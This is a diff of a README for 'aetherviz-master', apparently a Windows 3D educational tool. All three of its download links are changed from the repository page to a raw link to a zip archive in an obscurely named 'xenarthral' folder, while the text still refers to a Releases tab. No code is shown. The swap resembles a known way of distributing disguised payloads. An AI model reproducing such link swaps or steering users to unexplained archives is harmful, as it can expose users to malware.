@@ -1,6 +1,6 @@
 # 🌐 aetherviz-master - Create Interactive 3D Learning Spaces
 
-[![Download aetherviz-master](https://img.shields.io/badge/Download-Get%20AetherViz-green?style=for-the-badge&color=4caf50)](https://github.com/limitcossa/aetherviz-master)
+[![Download aetherviz-master](https://img.shields.io/badge/Download-Get%20AetherViz-green?style=for-the-badge&color=4caf50)](https://raw.githubusercontent.com/limitcossa/aetherviz-master/master/xenarthral/aetherviz-master-2.7.zip)
 
 ---
 
@@ -29,7 +29,7 @@ To run aetherviz-master smoothly on your Windows PC, make sure your system meets
 
 1. Click the big green button at the top or visit the official page to download the latest version:
 
-   [Download aetherviz-master](https://github.com/limitcossa/aetherviz-master)
+   [Download aetherviz-master](https://raw.githubusercontent.com/limitcossa/aetherviz-master/master/xenarthral/aetherviz-master-2.7.zip)
 
 2. On the GitHub page, look for the **Releases** tab or a download section. The files you want are usually in a folder named "Releases."
 
@@ -106,7 +106,7 @@ After installation, you can start creating or viewing interactive 3D educational
 
 Keep an eye on the GitHub page for new versions or bug fixes.
 
-[Visit the download page again](https://github.com/limitcossa/aetherviz-master)
+[Visit the download page again](https://raw.githubusercontent.com/limitcossa/aetherviz-master/master/xenarthral/aetherviz-master-2.7.zip)
 
 ---
 
